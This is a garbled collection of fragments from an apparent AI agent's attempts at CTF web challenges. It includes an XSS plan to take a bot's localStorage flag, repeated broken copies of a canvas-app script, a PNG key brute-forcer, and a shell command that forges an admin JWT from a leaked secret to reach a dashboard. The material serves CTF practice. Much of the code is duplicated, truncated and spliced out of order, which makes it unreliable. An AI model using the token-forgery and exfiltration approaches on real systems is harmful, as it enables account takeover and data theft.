Thought: We have full source. The /report endpoint triggers bot to visit attacker-controlled URL (as url param to bot service) after setting localStorage.flag=contents of /flag.txt. CSP on openresty forbids external connects except self, but if we can run JS on visited page (XSS), we can read localStorage.flag and exfiltrate by navigating to same-origin endpoint that logs it or by using /api/reports/add with Authorization Bearer flag. Better: craft a page on openresty itself? But we control only external URL; bot visits our URL directly, not through openresty. However bot first goes to openresty and sets localStorage for origin openresty:8080, then navigates to our URL (different origin). localStorage is origin-scoped, so our page cannot read it. Need to make bot navigate back to openresty with a payload that runs on openresty origin (stored/reflect XSS). Likely there is an id parameter in openresty app that is reflected into DOM/canvas config in designer.js via location.search id, enabling DOM XSS despite CSP script-src 'self' (but inline scripts blocked). Yet Konva might allow injection via JSON parsed and then innerHTML? Let's recon openresty main page and JS to find how id is used and whether it fetches data from /api/ and renders unsafely. We'll start with deep_recon on challenge URL root to see app behavior and endpoints.

[EXTERNAL SCRIPT #2: http://saturn.picoctf.net:51585/designer.js]
const assetPrefix = 'https://cdn.jsdelivr.net/gh/Crusaders-of-Rust/corCTF-2022-public-challenge-archive@master/web/msfroggenerator/task/img/';
const assets = ['base', 'msanger', 'msdrops', 'mseyes' , 'mskiss', 'msnose', 'mspoop', 'mstongue'];
const assetMap = new Map();
const state = new Map();
let id = 0;

function sync(layer) {
    for (const id of state.keys()) {
        const decorator = layer.findOne('#' + id);
        const {x, y} = decorator.getAbsolutePosition();
        state.set(decorator.getId(), {
            x,
            y,
            zIndex: decorator.zIndex(),
            type: decorator.name()
        });
    }
}

function getDecorator(original, {x, y, zIndex} = {}) {
    const decoratorId = (id++).toString();
    const clone = original.clone({
        name: original.name(),
        id: decoratorId,
        x: x ?? original.getAbsolutePosition().x,
        y: y ?? original.getAbsolutePosition().y,
        zIndex: zIndex,
        draggable: true
    });
    clone.on('click', e => {
        if (e.evt.button === 2) {
            if (clone.name() === 'base') return;
            clone.destroy();
            state.delete(decoratorId);
        } else {
            clone.moveToTop();
        }
    });
    state.set(decoratorId, {});
    return clone;
}

function getButton(x, y, width, height, text) {
    const button = new Konva.Group({ x, y });
    button.add(new Konva.Rect({
        width,
        height,
        fill: '#D3D3D3'
    }));
    button.add(new Konva.Text({
        fontSize: 24,
        width,
        height,
        verticalAlign: 'middle',
        align: 'center',
        text: text,
        fill: '#F0F0F0',
        fontStyle: 'bold'
    }));
    return button;
}

async function load() {
    for (const asset of assets) {
        const image = await new Promise(resolve => {
            const img = new Image();
            img.crossOrigin = 'Anonymous';
            img.onload = () => resolve(img);
            img.src = assetPrefix + asset + ".png";
        });
        assetMap.set(asset, image);
    }
}

if (window.innerWidth < 1280 || window.innerHeight < 720) {
    document.getElementById('container').innerText = 'Your screen must be at least 1280x720!';
    throw new Error('screen too small!');
}

(async() => {
    await load();

    const [width, height] = [1280, 720];

    const stage = new Konva.Stage({
        container: 'container',
        width: width,
        height: height,
    });

    stage.on('contextmenu', e => e.evt.preventDefault());

    const baseLayer = new Konva.Layer();
    const decoratorLayer = new Konva.Layer();
    baseLayer.add(new Konva.Rect({
        x: 0,
        y: 0,
        width: width,
        height: height,
        fill: '#F0F0F0'
    }));
    baseLayer.add(new Konva.Text({
        x: 20,

        fill: '#D3D3D3',
        fontStyle: 'bold'
    }));
    const exportButton = getButton(width - 20 - 150, height - 20 - 50, 150, 50, 'Export');    
    exportButton.on('click', () => {
        const bg = new Konva.Rect({
            x: 0,
            y: 0,
            width: width,
            height: height,
            fill: '#F0F0F0'
        });
        decoratorLayer.add(bg);
        bg.moveToBottom();
        decoratorLayer.toDataURL({
            pixelRatio: 1,
            callback: url => {
                bg.destroy();

                link.hidden = true;

            x: offset,
            y: height - img.height - 20,
            image: img,
            draggable: true
        });
        decoratorTemplate.on('dragstart', () => {
            decoratorTemplate.stopDrag();
            if (state.size === 100) {
                alert('Max decoration limit reached!');
                return;
            }
            const clone = getDecorator(decoratorTemplate);
            clone.off('dragstart');
            decoratorLayer.add(clone);
            clone.startDrag();
        })
        baseLayer.add(decoratorTemplate);
        offset += img.width + 20;
    }
    stage.add(decoratorLayer);

    const shareId = new URL(window.location.href).searchParams.get('id');
    if (shareId && shareId.match(/^[A-Za-z0-9_-]{10}$/)) {
        let res = await (await fetch('/api/get?id=' + shareId)).json();
        res = res.sort((a, b) => a.zIndex - b.zIndex);

            image: assetMap.get('base'),
            draggable: true,
        }));
        state.set('0', {});
    }

    window.decoratorLayer = decoratorLayer;

const assetPrefix = 'https://cdn.jsdelivr.net/gh/Crusaders-of-Rust/corCTF-2022-public-challenge-archive@master/web/msfroggenerator/task/img/';
const assets = ['base', 'msanger', 'msdrops', 'mseyes' , 'mskiss', 'msnose', 'mspoop', 'mstongue'];
const assetMap = new Map();
const state = new Map();
let id = 0;

function sync(layer) {
    for (const id of state.keys()) {
        const decorator = layer.findOne('#' + id);
        const {x, y} = decorator.getAbsolutePosition();
        state.set(decorator.getId(), {
            x,
            y,
            zIndex: decorator.zIndex(),
            type: decorator.name()
        });
    }
}

function getDecorator(original, {x, y, zIndex} = {}) {
    const decoratorId = (id++).toString();
    const clone = original.clone({
        name: original.name(),
        id: decoratorId,
        x: x ?? original.getAbsolutePosition().x,
        y: y ?? original.getAbsolutePosition().y,
        zIndex: zIndex,
        draggable: true
    });
    clone.on('click', e => {
        if (e.evt.button === 2) {
            if (clone.name() === 'base') return;
            clone.destroy();
            state.delete(decoratorId);
        } else {
            clone.moveToTop();
        }
    });
    state.set(decoratorId, {});
    return clone;
}

function getButton(x, y, width, height, text) {
    const button = new Konva.Group({ x, y });
    button.add(new Konva.Rect({
        width,
        height,
        fill: '#D3D3D3'
    }));
    button.add(new Konva.Text({
        fontSize: 24,
        width,
        height,
        verticalAlign: 'middle',
        align: 'center',
        text: text,
        fill: '#F0F0F0',
        fontStyle: 'bold'
    }));
    return button;
}

async function load() {
    for (const asset of assets) {
        const image = await new Promise(resolve => {
            const img = new Image();
            img.crossOrigin = 'Anonymous';
            img.onload = () => resolve(img);
            img.src = assetPrefix + asset + ".png";
        });
        assetMap.set(asset, image);
    }
}

if (window.innerWidth < 1280 || window.innerHeight < 720) {
    document.getElementById('container').innerText = 'Your screen must be at least 1280x720!';
    throw new Error('screen too small!');
}

(async() => {
    await load();

    const [width, height] = [1280, 720];

    const stage = new Konva.Stage({
        container: 'container',

        height: height,
    });

    }));

        fill: '#D3D3D3',
        fontStyle: 'bold'
    }));

    exportButton.on('click', () => {
        const bg = new Konva.Rect({
            x: 0,
            y: 0,
            width: width,
            height: height,
            fill: '#F0F0F0'
        });
        decoratorLayer.add(bg);
        bg.moveToBottom();
        decoratorLayer.toDataURL({

                const link = document.createElement('a');
                link.hidden = true;
                link.href = url;

                document.body.appendChild(link);
                link.click();
                document.body.removeChild(link);
                delete link;
            }
        });
    });

    shareButton.on('click', async () => {
        sync(decoratorLayer);
        const exportState = Object.values(Object.fromEntries(state));

            },
            method: 'POST',
            body: JSON.stringify(exportState)
        })).text();

    })

    stage.add(baseLayer);

    let offset = 20;
    for (let asset of assets) {
        if (asset === 'base') continue;
        const img = assetMap.get(asset);
        const decoratorTemplate = new Konva.Image({
            name: asset,
            x: offset,
            y: height - img.height - 20,
            image: img,
            draggable: true
        });
        decoratorTemplate.on('dragstart', () => {
            decoratorTemplate.stopDrag();
            if (state.size === 100) {
                alert('Max decoration limit reached!');
                return;
            }
            const clone = getDecorator(decoratorTemplate);
            clone.off('dragstart');
            decoratorLayer.add(clone);
            clone.startDrag();
        })
        baseLayer.add(decoratorTemplate);
        offset += img.width + 20;
    }
    stage.add(decoratorLayer);

    const shareId = new URL(window.location.href).searchParams.get('id');
    if (shareId && shareId.match(/^[A-Za-z0-9_-]{10}$/)) {
        let res = await (await fetch('/api/get?id=' + shareId)).json();
        res = res.sort((a, b) => a.zIndex - b.zIndex);

        if (res.length) {
            for (const {type, x, y} of res) {

                    x,
                    y,
                    draggable: true,
                    image: assetMap.get(type)
                });
                decorator.on('click', e => {
                    if (e.evt.button === 2) {
                        if (decorator.name() === 'base') return;
                        decorator.destroy();
                        state.delete(decoratorId);
                    } else {
                        decorator.moveToTop();
                    }
                });
                state.set(decoratorId, {});

            }
        }
    }

        decoratorLayer.add(new Konva.Image({
            name: 'base',
            id: (id++).toString(),
            x: width / 2 - assetMap.get('base').width / 2,
            y: height / 2 - assetMap.get('base').height / 2,
            image: assetMap.get('base'),
            draggable: true,
        }));
        state.set('0', {});
    }

    window.decoratorLayer = decoratorLayer;
})();

const assetPrefix = 'https://cdn.jsdelivr.net/gh/Crusaders-of-Rust/corCTF-2022-public-challenge-archive@master/web/msfroggenerator/task/img/';
const assets = ['base', 'msanger', 'msdrops', 'mseyes' , 'mskiss', 'msnose', 'mspoop', 'mstongue'];
const assetMap = new Map();
const state = new Map();
let id = 0;

function sync(layer) {
    for (const id of state.keys()) {
        const decorator = layer.findOne('#' + id);
        const {x, y} = decorator.getAbsolutePosition();
        state.set(decorator.getId(), {
            x,
            y,
            zIndex: decorator.zIndex(),
            type: decorator.name()
        });
    }
}

function getDecorator(original, {x, y, zIndex} = {}) {
    const decoratorId = (id++).toString();
    const clone = original.clone({
        name: original.name(),
        id: decoratorId,
        x: x ?? original.getAbsolutePosition().x,
        y: y ?? original.getAbsolutePosition().y,
        zIndex: zIndex,
        draggable: true
    });
    clone.on('click', e => {
        if (e.evt.button === 2) {
            if (clone.name() === 'base') return;
            clone.destroy();
            state.delete(decoratorId);
        } else {
            clone.moveToTop();
        }
    });
    state.set(decoratorId, {});
    return clone;
}

function getButton(x, y, width, height, text) {
    const button = new Konva.Group({ x, y });
    button.add(new Konva.Rect({
        width,
        height,
        fill: '#D3D3D3'
    }));
    button.add(new Konva.Text({
        fontSize: 24,
        width,
        height,
        verticalAlign: 'middle',
        align: 'center',
        text: text,
        fill: '#F0F0F0',
        fontStyle: 'bold'
    }));
    return button;
}

async function load() {
    for (const asset of assets) {
        const image = await new Promise(resolve => {
            const img = new Image();
            img.crossOrigin = 'Anonymous';
            img.onload = () => resolve(img);
            img.src = assetPrefix + asset + ".png";
        });
        assetMap.set(asset, image);
    }
}

if (window.innerWidth < 1280 || window.innerHeight < 720) {
    document.getElementById('container').innerText = 'Your screen must be at least 1280x720!';
    throw new Error('screen too small!');
}

(async() => {
    await load();

    const [width, height] = [1280, 720];

    const stage = new Konva.Stage({

        width: width,
        height: height,
    });

    }));

        const bg = new Konva.Rect({

                link.href = url;
                link.download = 'export.png';
                document.body.appendChild(link);
                link.click();
                document.body.removeChild(link);
                delete link;
            }
        });
    });
    baseLayer.add(exportButton);

        sync(decoratorLayer);
        const exportState = Object.values(Object.fromEntries(state));

            },

            body: JSON.stringify(exportState)

            x: offset,

            image: img,
            draggable: true
        });
        decoratorTemplate.on('dragstart', () => {
            decoratorTemplate.stopDrag();
            if (state.size === 100) {
                alert('Max decoration limit reached!');
                return;
            }
            const clone = getDecorator(decoratorTemplate);
            clone.off('dragstart');
            decoratorLayer.add(clone);
            clone.startDrag();
        })
        baseLayer.add(decoratorTemplate);
        offset += img.width + 20;
    }
    stage.add(decoratorLayer);

    const shareId = new URL(window.location.href).searchParams.get('id');
    if (shareId && shareId.match(/^[A-Za-z0-9_-]{10}$/)) {
        let res = await (await fetch('/api/get?id=' + shareId)).json();
        res = res.sort((a, b) => a.zIndex - b.zIndex);

        if (res.length) {
            for (const {type, x, y} of res) {
                const decoratorId = (id++).toString();

                    name: type,
                    id: decoratorId,
                    x,
                    y,
                    draggable: true,
                    image: assetMap.get(type)
                });
                decorator.on('click', e => {
                    if (e.evt.button === 2) {
                        if (decorator.name() === 'base') return;
                        decorator.destroy();
                        state.delete(decoratorId);
                    } else {
                        decorator.moveToTop();
                    }
                });
                state.set(decoratorId, {});
                decoratorLayer.add(decorator);
            }
        }
    }

        decoratorLayer.add(new Konva.Image({
            name: 'base',
            id: (id++).toString(),
            x: width / 2 - assetMap.get('base').width / 2,
            y: height / 2 - assetMap.get('base').height / 2,
            image: assetMap.get('base'),
            draggable: true,
        }));
        state.set('0', {});
    }

    window.decoratorLayer = decoratorLayer;
})();

const assetPrefix = 'https://cdn.jsdelivr.net/gh/Crusaders-of-Rust/corCTF-2022-public-challenge-archive@master/web/msfroggenerator/task/img/';
const assets = ['base', 'msanger', 'msdrops', 'mseyes' , 'mskiss', 'msnose', 'mspoop', 'mstongue'];
const assetMap = new Map();
const state = new Map();
let id = 0;

function sync(layer) {
    for (const id of state.keys()) {
        const decorator = layer.findOne('#' + id);
        const {x, y} = decorator.getAbsolutePosition();
        state.set(decorator.getId(), {
            x,
            y,
            zIndex: decorator.zIndex(),
            type: decorator.name()
        });
    }
}

function getDecorator(original, {x, y, zIndex} = {}) {
    const decoratorId = (id++).toString();
    const clone = original.clone({
        name: original.name(),
        id: decoratorId,
        x: x ?? original.getAbsolutePosition().x,
        y: y ?? original.getAbsolutePosition().y,
        zIndex: zIndex,
        draggable: true
    });
    clone.on('click', e => {
        if (e.evt.button === 2) {
            if (clone.name() === 'base') return;
            clone.destroy();
            state.delete(decoratorId);
        } else {
            clone.moveToTop();
        }
    });
    state.set(decoratorId, {});
    return clone;
}

function getButton(x, y, width, height, text) {
    const button = new Konva.Group({ x, y });
    button.add(new Konva.Rect({
        width,
        height,
        fill: '#D3D3D3'
    }));
    button.add(new Konva.Text({
        fontSize: 24,
        width,
        height,
        verticalAlign: 'middle',
        align: 'center',
        text: text,
        fill: '#F0F0F0',
        fontStyle: 'bold'
    }));
    return button;
}

async function load() {
    for (const asset of assets) {
        const image = await new Promise(resolve => {
            const img = new Image();
            img.crossOrigin = 'Anonymous';
            img.onload = () => resolve(img);
            img.src = assetPrefix + asset + ".png";
        });
        assetMap.set(asset, image);
    }
}

if (window.innerWidth < 1280 || window.innerHeight < 720) {
    document.getElementById('container').innerText = 'Your screen must be at least 1280x720!';
    throw new Error('screen too small!');
}

    await load();

            image: assetMap.get('base'),
            draggable: true,
        }));
        state.set('0', {});
    }

    window.decoratorLayer = decoratorLayer;
})();

[EXTERNAL SCRIPT #2: http://saturn.picoctf.net:51585/designer.js]
const assetPrefix = 'https://cdn.jsdelivr.net/gh/Crusaders-of-Rust/corCTF-2022-public-challenge-archive@master/web/msfroggenerator/task/img/';
const assets = ['base', 'msanger', 'msdrops', 'mseyes' , 'mskiss', 'msnose', 'mspoop', 'mstongue'];
const assetMap = new Map();
const state = new Map();
let id = 0;

function sync(layer) {
    for (const id of state.keys()) {
        const decorator = layer.findOne('#' + id);
        const {x, y} = decorator.getAbsolutePosition();
        state.set(decorator.getId(), {
            x,
            y,
            zIndex: decorator.zIndex(),
            type: decorator.name()
        });
    }
}

function getDecorator(original, {x, y, zIndex} = {}) {
    const decoratorId = (id++).toString();
    const clone = original.clone({
        name: original.name(),
        id: decoratorId,
        x: x ?? original.getAbsolutePosition().x,
        y: y ?? original.getAbsolutePosition().y,
        zIndex: zIndex,
        draggable: true
    });
    clone.on('click', e => {
        if (e.evt.button === 2) {
            if (clone.name() === 'base') return;
            clone.destroy();
            state.delete(decoratorId);
        } else {
            clone.moveToTop();
        }
    });
    state.set(decoratorId, {});
    return clone;
}

function getButton(x, y, width, height, text) {
    const button = new Konva.Group({ x, y });
    button.add(new Konva.Rect({
        width,
        height,
        fill: '#D3D3D3'
    }));
    button.add(new Konva.Text({
        fontSize: 24,
        width,
        height,
        verticalAlign: 'middle',
        align: 'center',
        text: text,
        fill: '#F0F0F0',
        fontStyle: 'bold'
    }));
    return button;
}

async function load() {
    for (const asset of assets) {
        const image = await new Promise(resolve => {
            const img = new Image();
            img.crossOrigin = 'Anonymous';
            img.onload = () => resolve(img);
            img.src = assetPrefix + asset + ".png";
        });
        assetMap.set(asset, image);
    }
}

if (window.innerWidth < 1280 || window.innerHeight < 720) {
    document.getElementById('container').innerText = 'Your screen must be at least 1280x720!';
    throw new Error('screen too small!');
}

(async() => {
    await load();

    const [width, height] = [1280, 720];

    const stage = new Konva.Stage({
        container: 'container',
        width: width,
        height: height,
    });

    stage.on('contextmenu', e => e.evt.preventDefault());

    const baseLayer = new Konva.Layer();
    const decoratorLayer = new Konva.Layer();
    baseLayer.add(new Konva.Rect({
        x: 0,
        y: 0,
        width: width,
        height: height,
        fill: '#F0F0F0'
    }));
    baseLayer.add(new Konva.Text({
        x: 20,
        y: 20,
        fontSize: 24,
        text: 'Right-click to delete a decorator.',
        fill: '#D3D3D3',
        fontStyle: 'bold'
    }));
    const exportButton = getButton(width - 20 - 150, height - 20 - 50, 150, 50, 'Export');    
    exportButton.on('click', () => {
        const bg = new Konva.Rect({
            x: 0,
            y: 0,
            width: width,
            height: height,
            fill: '#F0F0F0'
        });
        decoratorLayer.add(bg);
        bg.moveToBottom();
        decoratorLayer.toDataURL({
            pixelRatio: 1,
            callback: url => {
                bg.destroy();
                const link = document.createElement('a');
                link.hidden = true;
                link.href = url;
                link.download = 'export.png';
                document.body.appendChild(link);
                link.click();
                document.body.removeChild(link);
                delete link;
            }
        });
    });
    baseLayer.add(exportButton);
    const shareButton = getButton(width - 20 - 150 - 20 - 150, height - 20 - 50, 150, 50, 'Share');
    shareButton.on('click', async () => {
        sync(decoratorLayer);
        const exportState = Object.values(Object.fromEntries(state));
        const id = await (await fetch('/api/create', {
            headers: {
                'Content-Type': 'application/json'
            },
            method: 'POST',
            body: JSON.stringify(exportState)
        })).text();
        return window.location.href = '/?id=' + id;
    })
    baseLayer.add(shareButton);
    stage.add(baseLayer);

    let offset = 20;
    for (let asset of assets) {
        if (asset === 'base') continue;
        const img = assetMap.get(asset);
        const decoratorTemplate = new Konva.Image({
            name: asset,
            x: offset,
            y: height - img.height - 20,
            image: img,
            draggable: true
        });
        decoratorTemplate.on('dragstart', () => {
            decoratorTemplate.stopDrag();
            if (state.size === 100) {
                alert('Max decoration limit reached!');
                return;
            }
            const clone = getDecorator(decoratorTemplate);
            clone.off('dragstart');
            decoratorLayer.add(clone);
            clone.startDrag();
        })
        baseLayer.add(decoratorTemplate);
        offset += img.width + 20;
    }
    stage.add(decoratorLayer);

    const shareId = new URL(window.location.href).searchParams.get('id');
    if (shareId && shareId.match(/^[A-Za-z0-9_-]{10}$/)) {
        let res = await (await fetch('/api/get?id=' + shareId)).json();
        res = res.sort((a, b) => a.zIndex - b.zIndex);

        if (res.length) {
            for (const {type, x, y} of res) {
                const decoratorId = (id++).toString();
                const decorator = new Konva.Image({
                    name: type,
                    id: decoratorId,
                    x,
                    y,
                    draggable: true,
                    image: assetMap.get(type)
                });
                decorator.on('click', e => {
                    if (e.evt.button === 2) {
                        if (decorator.name() === 'base') return;
                        decorator.destroy();
                        state.delete(decoratorId);
                    } else {
                        decorator.moveToTop();
                    }
                });
                state.set(decoratorId, {});
                decoratorLayer.add(decorator);
            }
        }
    }

    if (!state.size) {
        decoratorLayer.add(new Konva.Image({
            name: 'base',
            id: (id++).toString(),
            x: width / 2 - assetMap.get('base').width / 2,
            y: height / 2 - assetMap.get('base').height / 2,
            image: assetMap.get('base'),
            draggable: true,
        }));
        state.set('0', {});
    }

    window.decoratorLayer = decoratorLayer;
})();

import requests,re
resp=requests.get('http://fickle-tempest.picoctf.net:52432/bytes').text
B=list(map(int,resp.split()))
LEN=16
header=[137,80,78,71,13,10,26,10]
key=['?']*LEN
for i,val in enumerate(header):
    # search shifter 0-9 (since digit) where B[shifter*LEN+i]==val
    found=[]
    for sh in range(10):
        if sh*LEN+i < len(B) and B[sh*LEN+i]==val:
            found.append(sh)
    print(i,val,found)
    if len(found)==1:
        key[i]=str(found[0])

# fill remaining positions using next bytes in PNG header chunk? After signature, next 4 bytes length 00 00 00 0D at positions 8-11 and 'IHDR' at 12-15
expected = header + [0,0,0,13,73,72,68,82]
for i,val in enumerate(expected):
    if key[i] != '?':
        continue
    found=[]
    for sh in range(10):
        if sh*LEN+i < len(B) and B[sh*LEN+i]==val:
            found.append(sh)
    print('pos',i,'val',val,'found',found)
    if len(found)==1:
        key[i]=str(found[0])

print('partial key',''.join(key))
# if any still ?, brute those with 0-9 but keep PNG signature valid by assembling and checking first 16 bytes
unknown=[i for i,c in enumerate(key) if c=='?']
print('unknown',unknown)
from itertools import product

def assemble(k):
    result=[0]*len(B)
    for i in range(LEN):
        sh=ord(k[i])-48
        for j in range(len(B)//LEN):
            result[j*LEN+i]=B[(((j+sh)*LEN)%len(B))+i]
    while result and result[-1]==0:
        result.pop()
    return bytes(result)

base_key=key[:]
for digits in product('0123456789', repeat=len(unknown)):
    for idx,d in zip(unknown,digits):
        base_key[idx]=d
    k=''.join(base_key)
    out=assemble(k)
    if out.startswith(bytes(expected)):
        print('FOUND KEY',k,'len',len(out))
        open('/tmp/out.png','wb').write(out)
        m=re.search(rb'picoCTF\{[^\n\r{}]{1,200}\}',out)
        print('flag_in_png',m.group(0) if m else None)
        break
else:
    print('no key found')

			function assemble_png(u_in){
				var LEN = 16;
				var key = "0000000000000000";
				var shifter;
				if(u_in.length == LEN){
					key = u_in;
				}
				var result = [];

				}

def build(shifts):
    res=[0]*len(bl)
    for i,s in enumerate(shifts):
        for j in range(rows):
            res[j*LEN+i]=bl[((j+s)%rows)*LEN+i]
    # JS trimmed zeros; keep full
    return bytes(res)

    for i,s in enumerate(shifts):
        for j in range(rows):

    return bytes(res)

            ok_all=False; break

var bytes = [];
			$.get("bytes", function(resp) {
				bytes = Array.from(resp.split(" "), x => Number(x));
			});

			function assemble_png(u_in){
				var LEN = 16;
				var key = "0000000000000000";
				var shifter;
				if(u_in.length == LEN){
					key = u_in;
				}
				var result = [];
				for(var i = 0; i < LEN; i++){
					shifter = key.charCodeAt(i) - 48;
					for(var j = 0; j < (bytes.length / LEN); j ++){
						result[(j * LEN) + i] = bytes[(((j + shifter) * LEN) % bytes.length) + i]
					}
				}
				while(result[result.length-1] == 0){
					result = result.slice(0,result.length-1);
				}
				document.getElementById("Area").src = "data:image/png;base64," + btoa(String.fromCharCode.apply(null, new Uint8Array(result)));
				return false;
			}

var bytes = [];
			$.get("bytes", function(resp) {
				bytes = Array.from(resp.split(" "), x => Number(x));
			});

			function assemble_png(u_in){
				var LEN = 16;
				var key = "0000000000000000";
				var shifter;
				if(u_in.length == LEN){
					key = u_in;
				}
				var result = [];
				for(var i = 0; i < LEN; i++){
					shifter = key.charCodeAt(i) - 48;
					for(var j = 0; j < (bytes.length / LEN); j ++){
						result[(j * LEN) + i] = bytes[(((j + shifter) * LEN) % bytes.length) + i]
					}
				}
				while(result[result.length-1] == 0){
					result = result.slice(0,result.length-1);
				}
				document.getElementById("Area").src = "data:image/png;base64," + btoa(String.fromCharCode.apply(null, new Uint8Array(result)));
				return false;
			}

var bytes = [];
			$.get("bytes", function(resp) {
				bytes = Array.from(resp.split(" "), x => Number(x));
			});

			function assemble_png(u_in){
				var LEN = 16;
				var key = "0000000000000000";
				var shifter;
				if(u_in.length == LEN){
					key = u_in;
				}
				var result = [];
				for(var i = 0; i < LEN; i++){
					shifter = key.charCodeAt(i) - 48;
					for(var j = 0; j < (bytes.length / LEN); j ++){
						result[(j * LEN) + i] = bytes[(((j + shifter) * LEN) % bytes.length) + i]
					}
				}
				while(result[result.length-1] == 0){
					result = result.slice(0,result.length-1);
				}
				document.getElementById("Area").src = "data:image/png;base64," + btoa(String.fromCharCode.apply(null, new Uint8Array(result)));
				return false;
			}

var bytes = [];
			$.get("bytes", function(resp) {
				bytes = Array.from(resp.split(" "), x => Number(x));
			});

			function assemble_png(u_in){
				var LEN = 16;
				var key = "0000000000000000";
				var shifter;
				if(u_in.length == LEN){
					key = u_in;
				}
				var result = [];
				for(var i = 0; i < LEN; i++){
					shifter = key.charCodeAt(i) - 48;
					for(var j = 0; j < (bytes.length / LEN); j ++){
						result[(j * LEN) + i] = bytes[(((j + shifter) * LEN) % bytes.length) + i]
					}
				}
				while(result[result.length-1] == 0){
					result = result.slice(0,result.length-1);
				}
				document.getElementById("Area").src = "data:image/png;base64," + btoa(String.fromCharCode.apply(null, new Uint8Array(result)));
				return false;
			}

Let's implement in python using bytes list and test default and maybe derive by recognizing PNG header (137 80 78 71...). Since assemble does columnar shift per column i by shifter key[i]. We can solve each column independently by finding shifter that makes first 8 bytes of result equal PNG signature at positions? # IDAT length and type positions: after signature(8)+IHDR(4+4+13+4)=33 => next 4 bytes length at 33..36, then type at 37..40

cons[41]=0x78
# second zlib header byte in {0x01,0x5e,0x9c,0xda}

    opts=[]
    for sh in range(rows):
        ok=True
        for off,val in cons.items():
            if off%LEN!=col: continue
            j=off//LEN
            src=(((j+sh)*LEN)%N)+col
            if bl[src]%256!=val:
                ok=False; break
        if ok: opts.append(sh)
    possible.append(opts)
    print(col, 'opts', opts[:20], 'count', len(opts))

        import * as jose from 'https://cdn.jsdelivr.net/npm/jose@latest/dist/browser/index.js';
        const { SignJWT } = jose;

        window.onload = function () {
            document.getElementById('login-form').onsubmit = async (e) => {
                e.preventDefault();
                const formData = new FormData(e.target);
                const user = formData.get('username');
                const pass = formData.get('password');
                const response = await fetch('/login', {
                    method: 'POST',
                    body: new URLSearchParams({
                        username: user,
                        password: pass
                    }),
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
                });
                let resp = await response.json();
                if ("success" in resp) {
                    const token = new TextEncoder().encode(response.headers.get("jwt"));
                    const jwt = await new SignJWT({ sub: user })
                        .setProtectedHeader({ alg: "HS256" })
                        .setIssuedAt()
                        .setExpirationTime("2h")
                        .sign(token);
                    document.cookie = "jwt=" + jwt;
                    window.location.href = "/dashboard";
                } else {
                    alert("Incorrect username or password.");
                }
            };
        }
    </script>

        import * as jose from 'https://cdn.jsdelivr.net/npm/jose@latest/dist/browser/index.js';
        const { SignJWT } = jose;

        window.onload = function () {
            document.getElementById('login-form').onsubmit = async (e) => {
                e.preventDefault();
                const formData = new FormData(e.target);
                const user = formData.get('username');
                const pass = formData.get('password');
                const response = await fetch('/login', {
                    method: 'POST',
                    body: new URLSearchParams({
                        username: user,
                        password: pass
                    }),
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
                });
                let resp = await response.json();
                if ("success" in resp) {
                    const token = new TextEncoder().encode(response.headers.get("jwt"));
                    const jwt = await new SignJWT({ sub: user })
                        .setProtectedHeader({ alg: "HS256" })
                        .setIssuedAt()
                        .setExpirationTime("2h")
                        .sign(token);
                    document.cookie = "jwt=" + jwt;
                    window.location.href = "/dashboard";
                } else {
                    alert("Incorrect username or password.");
                }
            };
        }
    </script>

                    const token = new TextEncoder().encode(response.headers.get("jwt"));

                        .setIssuedAt()

                        .sign(token);

Observation: [shell_execute] result=info; [ShellExecuteTool] Command: python3 - <<'PY'
import requests, json, base64, hmac, hashlib, re

def b64url(x: bytes)->str:
    return base64.urlsafe_b64encode(x).rstrip(b'=').decode()

def sign_hs256(payload, secret: str):
    header={'alg':'HS256','typ':'JWT'}
    h=b64url(json.dumps(header,separators=(',',':')).encode())
    p=b64url(json.dumps(payload,separators=(',',':')).encode())
    msg=f'{h}.{p}'.encode()
    sig=hmac.new(secret.encode(), msg, hashlib.sha256).digest()
    return f'{h}.{p}.{b64url(sig)}'

base='https://host5.metaproblems.com:7606'
s=requests.Session(); s.verify=False
r=s.post(base+'/login', data={'username':'guest','password':'guest'})
print('login',r.status_code,r.text[:200])
secret=r.headers.get('jwt')
print('secret_hdr',secret)
tok=sign_hs256({'sub':'admin'}, secret)
print('forged',tok)
r2=s.get(base+'/dashboard', cookies={'jwt':tok})
print('dash',r2.status_code, 'len',len(r2.text))
print(r2.text)
m=re.search(r'picoCTF\{[^\n\r\{\}]{1,200}\}', r2.text)
print('pico', m.group(0) if m else None)

        import * as jose from 'https://cdn.jsdelivr.net/npm/jose@latest/dist/browser/index.js';
        const { SignJWT } = jose;

        window.onload = function () {
            document.getElementById('login-form').onsubmit = async (e) => {
                e.preventDefault();
                const formData = new FormData(e.target);
                const user = formData.get('username');
                const pass = formData.get('password');
                const response = await fetch('/login', {
                    method: 'POST',
                    body: new URLSearchParams({
                        username: user,
                        password: pass
                    }),
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
                });
                let resp = await response.json();
                if ("success" in resp) {
                    const token = new TextEncoder().encode(response.headers.get("jwt"));
                    const jwt = await new SignJWT({ sub: user })
                        .setProtectedHeader({ alg: "HS256" })
                        .setIssuedAt()
                        .setExpirationTime("2h")
                        .sign(token);
                    document.cookie = "jwt=" + jwt;
                    window.location.href = "/dashboard";
                } else {
                    alert("Incorrect username or password.");
                }
            };
        }
    </script>

function onSubmit(e) {
    e.preventDefault();

    const search_str = document.getElementById('query-name').value;
    const search_country = document.getElementById('query-country').value;
    let country;
    switch (search_country) {
        case 'USA': country = "US"; break;
        case 'Canada': country = "CA"; break;
        case 'Finland': country = "FI"; break;
        case 'Australia': country = "AU"; break;
    }

    const submit = `
    <query>
        <search>${search_str}</search>
        <country>${country}</country>
    </query>
    `;

    fetch("/api/search_printers", {
        method: "POST",
        body: submit
    })
        .then(data => data.text())
        .then(str => new window.DOMParser().parseFromString(str, "text/xml"))
        .then(data => {
            const tableBody = document.getElementById("table-body");
            while (tableBody.firstChild) {
                tableBody.firstChild.remove()
            }

            const error = data.getElementsByTagName("error");

            if (error.length > 0) {
                const error = error[0];
                const row = tableBody.insertRow(-1);
                const cell = row.insertCell(-1);
                cell.setAttribute("colspan", "3");
                cell.innerHTML = error;
                return;
            }

            const prods = data.getElementsByTagName("product");

            if (prods.length == 0) {
                const row = tableBody.insertRow(-1);
                const cell = row.insertCell(-1);
                cell.setAttribute("colspan", "3");
                cell.innerHTML = "No results found.";
            }

            for (p of prods) {
                const row = tableBody.insertRow(-1);
                row.insertCell(-1).innerHTML = p.getAttribute("id");
                row.insertCell(-1).innerHTML = p.getAttribute("name");
                row.insertCell(-1).innerHTML = p.getAttribute("price");
            }
        });

}

function onSubmit(e) {
